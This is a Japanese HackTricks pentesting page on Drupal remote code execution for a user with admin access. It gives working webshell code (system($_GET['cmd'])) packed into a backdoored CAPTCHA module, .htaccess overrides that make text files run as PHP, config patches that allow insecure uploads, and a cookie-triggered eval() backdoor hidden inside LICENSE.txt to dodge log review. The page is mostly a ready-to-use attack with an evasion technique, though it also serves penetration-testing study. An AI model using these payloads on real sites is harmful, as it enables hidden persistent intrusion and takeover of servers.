# Drupal RCE

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**</strong>から**ゼロからヒーローまでAWSハッキングを学ぶ**<a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
- **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
- **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## PHPフィルターモジュールを使用する

{% hint style="warning" %}
Drupalの**古いバージョン（バージョン8より前）**では、管理者としてログインして**`PHPフィルター`モジュールを有効にする**ことが可能でした。これにより、「埋め込みPHPコード/スニペットを評価できる」ようになります。ただし、バージョン8からはこのモジュールがデフォルトでインストールされていません。
{% endhint %}

**プラグインphpがインストールされている必要があります**（_/_modules/php_ にアクセスして**403**が返された場合は、**存在します**。**見つからない**場合は、**プラグインphpがインストールされていません**）

_Modules_に移動 -> （**チェックを入れる**）_PHP Filter_ -> _Save configuration_

![](<../../../.gitbook/assets/image (247) (1).png>)

その後、_Add content_をクリック -> _Basic Page_または_Article_を選択 -> _本文にphpシェルコードを記述_ -> _Text format_で_PHP code_を選択 -> _Preview_を選択

![](<../../../.gitbook/assets/image (338).png>)

最後に、新しく作成したノードにアクセスしてください：
```bash
curl http://drupal-site.local/node/3
```
## PHP Filterモジュールのインストール

{% hint style="warning" %}
現在のバージョンでは、デフォルトのインストール後にウェブへのアクセスだけでプラグインをインストールすることはできなくなりました。
{% endhint %}

**バージョン8以降では、**[**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1)**モジュールはデフォルトでインストールされません**。この機能を利用するには、**モジュールを自分でインストールする必要があります**。

1. Drupalのウェブサイトからモジュールの最新バージョンをダウンロードします。
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. ダウンロードが完了したら、**`管理`** > **`レポート`** > **`利用可能な更新`**に移動します。
4. **`参照`**をクリックし、ダウンロードしたディレクトリからファイルを選択して、**`インストール`**をクリックします。
5. モジュールがインストールされたら、**`コンテンツ`**をクリックして、Drupal 7の例と同様に**新しい基本ページを作成**します。再度、**`テキスト形式`のドロップダウンから`PHPコード`を選択**することを忘れないでください。

## バックドア付きモジュール

{% hint style="warning" %}
現在のバージョンでは、デフォルトのインストール後にウェブへのアクセスだけでプラグインをインストールすることはできなくなりました。
{% endhint %}

バックドア付きモジュールは、**既存のモジュールにシェルを追加することで作成**できます。モジュールはdrupal.orgのウェブサイトで見つけることができます。[CAPTCHA](https://www.drupal.org/project/captcha)などのモジュールを選択しましょう。tar.gz形式の[アーカイブ](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz)のリンクをコピーします。

* アーカイブをダウンロードして、その内容を展開します。
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* 以下の内容で **PHPウェブシェル** を作成します：
```php
<?php
system($_GET["cmd"]);
?>
```
* 次に、フォルダへのアクセス権を自分自身に与えるために **`.htaccess`** ファイルを作成する必要があります。これは、Drupalが **`/modules`** フォルダへの直接アクセスを拒否するために必要です。
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* 上記の設定は、/modules内のファイルをリクエストしたときに/folderにルールを適用します。これらのファイルをcaptchaフォルダにコピーしてアーカイブを作成してください。
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* ウェブサイトに**管理アクセス**があると仮定し、**`Manage`**をクリックして、サイドバーで**`Extend`**をクリックします。次に、**`+ Install new module`**ボタンをクリックして、`http://drupal-site.local/admin/modules/install`のようなインストールページに移動します。バックドア付きのCaptchaアーカイブを参照して**`Install`**をクリックします。
* インストールが成功したら、**`/modules/captcha/shell.php`**に移動してコマンドを実行します。

## Drupalの設定同期を使用したバックドア設置 <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**投稿者** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### パート1（_Media_と_Media Library_の有効化）

_Extend_メニュー（/admin/modules）では、すでにインストールされているプラグインのように見えるものを有効化できます。デフォルトでは、_Media_と_Media Library_プラグインは有効になっていないようですので、有効にしてみましょう。

有効化前：

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

有効化後：

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### パート2（機能_設定同期_の活用） <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Drupalの設定エントリをダンプ（エクスポート）してアップロード（インポート）するために、_Configuration synchronization_機能を活用します：

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**system.file.ymlをパッチ**

最初のエントリ`allow_insecure_uploads`を以下のようにパッチしましょう：

ファイル: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

To:

ファイル: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**`field.field.media.document.field_media_document.yml`をパッチします**

次に、2番目のエントリ `file_extensions` を以下のようにパッチします：

ファイル: `field.field.media.document.field_media_document.yml`
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

To:

ファイル: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> このブログ投稿では使用しませんが、エントリ `file_directory` を任意の方法で定義し、パストラバーサル攻撃の対象となる可能性があることが指摘されています（したがって、Drupalファイルシステムツリー内で上に戻ることができます）。

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### パート3（機能「ドキュメントの追加」を活用） <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

最後のステップは最も簡単で、2つのサブステップに分かれています。最初のステップは、.htaccess形式のファイルをアップロードしてApacheディレクティブを活用し、.txtファイルをPHPエンジンで解釈できるようにすることです。2番目は、ペイロードを含む .txt ファイルをアップロードすることです。

ファイル: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
なぜこのトリックがクールなのか？

WebサーバーにWebshell（ここではLICENSE.txtと呼びます）がドロップされると、`$_COOKIE`を介してコマンドを送信でき、Webサーバーのログにはこれがテキストファイルへの正当なGETリクエストとして表示されます。

なぜWebshellをLICENSE.txtと名付けるのか？

単純に、たとえば[core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)（Drupalコアにすでに存在する）というファイルを取ると、339行で17.6 KBのサイズのファイルがあり、中間に少量のPHPコードを追加するのに適しています（ファイルが十分に大きいため）。

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

ファイル: パッチ済みLICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Part 3.1 (ファイル.htaccessをアップロード)**

まず、Apacheディレクティブを含むファイルをアップロードするために、_Add Document_ (/media/add/document) 機能を利用します。

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Part 3.2 (ファイルLICENSE.txtをアップロード)**

次に、ライセンスファイルに隠されたWebshellをアップロードするために、再び_Add Document_ (/media/add/document) 機能を利用します。

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Part 4 (Webshellとのやり取り) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

最後の部分は、Webshellとのやり取りです。

以下のスクリーンショットに示されているように、Webshellが期待するクッキーが定義されていない場合、Webブラウザを介してファイルを参照すると、次の結果が得られます。

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

攻撃者がクッキーを設定すると、Webshellとやり取りし、任意のコマンドを実行できます。

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

ログを見ると、txtファイルのみがリクエストされたようです。

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

この記事を読んでいただき、ありがとうございます。シェルを手に入れるのに役立つことを願っています。
